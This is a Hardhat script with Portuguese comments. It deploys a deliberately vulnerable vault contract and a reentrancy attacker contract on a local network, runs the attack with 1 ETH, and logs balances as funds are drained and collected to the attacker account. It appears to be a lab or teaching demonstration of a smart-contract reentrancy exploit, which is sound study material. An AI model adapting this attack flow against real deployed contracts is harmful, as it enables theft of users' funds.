// scripts/attack_reentrancy.js
const hre = require("hardhat");

async function main() {
  await hre.run("compile");

  const [deployer, attacker] = await hre.ethers.getSigners();

  // Deploy VulnerableVault
  const VaultFactory = await hre.ethers.getContractFactory("VulnerableVault", deployer);
  const vault = await VaultFactory.deploy();
  await vault.waitForDeployment();
  console.log("VulnerableVault deployed at", vault.target);

  // Deploy ReentrancyAttacker
  const AttFactory = await hre.ethers.getContractFactory("ReentrancyAttacker", attacker);
  const att = await AttFactory.deploy(vault.target);
  await att.waitForDeployment();
  console.log("ReentrancyAttacker deployed at", att.target);

  // Opcional: mostrar saldos antes
  console.log("Balances before attack:");
  console.log("Vault:", (await hre.ethers.provider.getBalance(vault.target)).toString());
  console.log("Attacker contract:", (await hre.ethers.provider.getBalance(att.target)).toString());

  // Execute attack ENVIANDO 1 ETH na chamada (msg.value será 1 ETH dentro do attack)
  const tx = await att.connect(attacker).attack({
    value: hre.ethers.parseEther("1"),
    gasLimit: 3_000_000
  });
  await tx.wait();
  console.log("Attack transaction mined");

  // Balances after
  const vaultBal = await hre.ethers.provider.getBalance(vault.target);
  const attackerContractBal = await hre.ethers.provider.getBalance(att.target);
  console.log("Vault balance:", vaultBal.toString());
  console.log("Attacker contract balance:", attackerContractBal.toString());

  // Collect to attacker EOA
  await att.connect(attacker).collect();
  const attackerEoaBal = await hre.ethers.provider.getBalance(attacker.address);
  console.log("Attacker EOA balance (approx):", attackerEoaBal.toString());
}

main().catch((err) => {
  console.error(err);
  process.exitCode = 1;
});
